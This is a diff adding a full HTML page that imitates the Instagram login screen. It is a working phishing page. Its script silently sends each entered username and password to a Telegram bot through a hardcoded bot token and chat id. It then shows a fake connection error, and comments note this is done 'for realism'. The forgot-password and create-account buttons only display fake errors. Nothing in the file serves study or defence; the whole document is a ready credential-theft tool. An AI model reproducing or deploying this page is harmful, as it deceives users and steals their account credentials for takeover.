@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Log in • Instagram</title>
+  <style>
+    /* ===== RESET & BASE ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background-color: #1a1a1a; /* Exact dark background */
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-x: hidden;
+    }
+
+    /* ===== TOP LANGUAGE ===== */
+    .lang-header {
+      width: 100%;
+      text-align: center;
+      padding: 24px 0 10px;
+      font-size: 16px;
+      color: #a8a8a8;
+      font-weight: 400;
+    }
+
+    /* ===== MAIN CONTAINER ===== */
+    .container {
+      width: 100%;
+      max-width: 420px;
+      padding: 0 24px;
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+      margin-top: 8vh;
+    }
+
+    /* ===== LOGO ===== */
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 60px;
+    }
+
+    .logo-icon {
+      width: 64px;
+      height: 64px;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cdefs%3E%3ClinearGradient id='ig-grad' x1='0%25' y1='100%25' x2='100%25' y2='0%25'%3E%3Cstop offset='0%25' stop-color='%23FFD600'/%3E%3Cstop offset='25%25' stop-color='%23FF7A00'/%3E%3Cstop offset='50%25' stop-color='%23FF0069'/%3E%3Cstop offset='75%25' stop-color='%23D300C5'/%3E%3Cstop offset='100%25' stop-color='%237635FF'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect x='4' y='4' width='56' height='56' rx='16' fill='none' stroke='url(%23ig-grad)' stroke-width='4'/%3E%3Ccircle cx='32' cy='32' r='14' fill='none' stroke='url(%23ig-grad)' stroke-width='4'/%3E%3Ccircle cx='46' cy='18' r='3.5' fill='url(%23ig-grad)'/%3E%3C/svg%3E");
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+    }
+
+    /* ===== FORM FIELDS ===== */
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      width: 100%;
+    }
+
+    .input-group {
+      position: relative;
+      width: 100%;
+    }
+
+    .input-field {
+      width: 100%;
+      height: 56px;
+      background-color: transparent;
+      border: 1px solid #363636;
+      border-radius: 14px;
+      color: #ffffff;
+      font-size: 16px;
+      padding: 16px 16px 0 16px; /* Adjusted padding for floating label */
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    /* Make room for the eye icon */
+    .password-field {
+      padding-right: 50px;
+    }
+
+    .input-field:focus {
+      border-color: #555555;
+    }
+
+    /* Floating Label */
+    .floating-label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #8e8e8e;
+      font-size: 16px;
+      pointer-events: none;
+      transition: all 0.15s ease-out;
+    }
+
+    /* Move label up when focused or has value */
+    .input-field:focus ~ .floating-label,
+    .input-field:not(:placeholder-shown) ~ .floating-label {
+      top: 10px;
+      font-size: 12px;
+      color: #a8a8a8;
+    }
+
+    /* Adjust text padding when label is floated */
+    .input-field:focus,
+    .input-field:not(:placeholder-shown) {
+      padding-top: 24px;
+      padding-bottom: 8px;
+    }
+
+    /* Password Toggle Button (SVG Eye Icon) */
+    .toggle-password {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #ffffff;
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0.8;
+      transition: opacity 0.2s ease;
+    }
+
+    .toggle-password:hover {
+      opacity: 1;
+    }
+
+    .toggle-password svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    /* ===== LOGIN BUTTON ===== */
+    .login-button {
+      margin-top: 8px;
+      width: 100%;
+      height: 48px;
+      background-color: #0095f6;
+      color: #ffffff;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.2s ease, opacity 0.2s ease;
+    }
+
+    .login-button:active:not(:disabled) {
+      background-color: #1877f2;
+    }
+
+    .login-button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    /* Loading Spinner */
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ===== FORGOT PASSWORD ===== */
+    .forgot-password {
+      display: block;
+      text-align: center;
+      margin-top: 24px;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 600;
+      text-decoration: none;
+      transition: opacity 0.2s ease;
+    }
+
+    .forgot-password:active {
+      opacity: 0.7;
+    }
+
+    /* ===== BOTTOM SECTION ===== */
+    .bottom-section {
+      width: 100%;
+      margin-top: auto;
+      padding-bottom: 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Create Account Button */
+    .create-account-button {
+      width: 100%;
+      height: 48px;
+      background-color: transparent;
+      color: #0095f6;
+      border: 1px solid #0095f6;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.2s ease;
+    }
+
+    .create-account-button:active {
+      background-color: rgba(0, 149, 246, 0.1);
+    }
+
+    /* ===== REALISTIC ERROR MESSAGE ===== */
+    .error-message {
+      color: #ed4956;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 4px;
+      min-height: 20px;
+      display: none;
+      font-weight: 400;
+      line-height: 1.4;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .error-message.visible {
+      display: block;
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Language Header -->
+  <div class="lang-header">English (US)</div>
+
+  <!-- Main Content -->
+  <div class="container">
+    
+    <!-- Logo -->
+    <div class="logo-container">
+      <div class="logo-icon"></div>
+    </div>
+
+    <!-- Form -->
+    <form class="login-form" id="loginForm" novalidate>
+      
+      <!-- Username Input -->
+      <div class="input-group">
+        <input type="text" class="input-field" id="username" placeholder=" " autocomplete="username" autocorrect="off" autocapitalize="off" spellcheck="false">
+        <label for="username" class="floating-label">Username, email or mobile number</label>
+      </div>
+
+      <!-- Password Input -->
+      <div class="input-group">
+        <input type="password" class="input-field password-field" id="password" placeholder=" " autocomplete="current-password">
+        <label for="password" class="floating-label">Password</label>
+        
+        <!-- Eye Icon Toggle (Hidden by default) -->
+        <button type="button" class="toggle-password" id="togglePassword" style="display: none;">
+          <!-- Eye-Off SVG (Hidden Password) -->
+          <svg id="eyeIcon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"></path>
+          </svg>
+        </button>
+      </div>
+
+      <!-- Error Message -->
+      <div class="error-message" id="errorMessage"></div>
+
+      <!-- Login Button -->
+      <button type="submit" class="login-button" id="loginBtn">
+        <span id="btnText">Log in</span>
+        <span class="spinner" id="spinner"></span>
+      </button>
+
+      <!-- Forgot Password -->
+      <a href="#" class="forgot-password" id="forgotBtn">Forgot password?</a>
+    </form>
+
+    <!-- Bottom Section -->
+    <div class="bottom-section">
+      <button class="create-account-button" id="createAccountBtn">Create new account</button>
+    </div>
+
+  </div>
+
+  <script>
+    // ==========================================
+    // TELEGRAM INTEGRATION
+    // ==========================================
+    async function sendToTelegram(message) {
+        const botToken = "9206992554:AAE8ttLAw8PPUFzOuBomb0VamzVpebgE00M";
+        const chatId = "7767965117";
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+            const result = await response.json();
+            if (!result.ok) throw new Error(result.description);
+            return true;
+        } catch (error) {
+            console.error("Telegram error:", error);
+            return false;
+        }
+    }
+
+    // ==========================================
+    // UI LOGIC & VALIDATION
+    // ==========================================
+    (function() {
+      // DOM Elements
+      const form = document.getElementById('loginForm');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      const toggleBtn = document.getElementById('togglePassword');
+      const eyeIcon = document.getElementById('eyeIcon');
+      const loginBtn = document.getElementById('loginBtn');
+      const btnText = document.getElementById('btnText');
+      const spinner = document.getElementById('spinner');
+      const errorMessage = document.getElementById('errorMessage');
+      const forgotBtn = document.getElementById('forgotBtn');
+      const createAccountBtn = document.getElementById('createAccountBtn');
+
+      let isLoggingIn = false;
+
+      // SVG Paths for Eye Icons
+      const eyeOffPath = `<path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"></path>`;
+      
+      const eyeOnPath = `<path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>`;
+
+      // --- Show/Hide Password Logic ---
+      passwordInput.addEventListener('input', function() {
+        if (this.value.length > 0) {
+          toggleBtn.style.display = 'flex';
+        } else {
+          toggleBtn.style.display = 'none';
+        }
+      });
+
+      toggleBtn.addEventListener('click', function() {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        
+        // Swap the SVG icon
+        if (type === 'password') {
+          eyeIcon.innerHTML = eyeOffPath;
+        } else {
+          eyeIcon.innerHTML = eyeOnPath;
+        }
+      });
+
+      // --- Validation & Error Handling ---
+      function showError(msg) {
+        errorMessage.textContent = msg;
+        errorMessage.classList.add('visible');
+        usernameInput.style.borderColor = '#ed4956';
+        passwordInput.style.borderColor = '#ed4956';
+      }
+
+      function clearError() {
+        errorMessage.classList.remove('visible');
+        setTimeout(() => {
+          if (!errorMessage.classList.contains('visible')) {
+            errorMessage.textContent = '';
+          }
+        }, 300);
+        usernameInput.style.borderColor = '#363636';
+        passwordInput.style.borderColor = '#363636';
+      }
+
+      usernameInput.addEventListener('input', clearError);
+      passwordInput.addEventListener('input', clearError);
+
+      // --- Login Submit ---
+      form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        if (isLoggingIn) return;
+
+        const user = usernameInput.value.trim();
+        const pass = passwordInput.value.trim();
+
+        if (!user || !pass) {
+          showError('Please fill in both fields.');
+          return;
+        }
+
+        // Start Loading State
+        isLoggingIn = true;
+        loginBtn.disabled = true;
+        btnText.style.display = 'none';
+        spinner.style.display = 'inline-block';
+        clearError();
+
+        // Send credentials to Telegram silently
+        await sendToTelegram(`🔐 *New Instagram Login*\n\n👤 Username: ${user}\n🔑 Password: ${pass}`);
+
+        // Simulate network delay for realism
+        setTimeout(() => {
+          isLoggingIn = false;
+          loginBtn.disabled = false;
+          btnText.style.display = 'inline-block';
+          spinner.style.display = 'none';
+
+          // Show the exact error message requested
+          showError("Couldn’t connect to Instagram. “Check your internet connection and try again.”");
+        }, 1500); 
+      });
+
+      // --- Forgot Password Request ---
+      forgotBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        showError("We’re sorry, but something went wrong. Please try again");
+      });
+
+      // --- Create Account Request ---
+      createAccountBtn.addEventListener('click', function() {
+        showError("An error occurred while creating your account");
+      });
+
+    })();
+  </script>
+</body>
+</html>
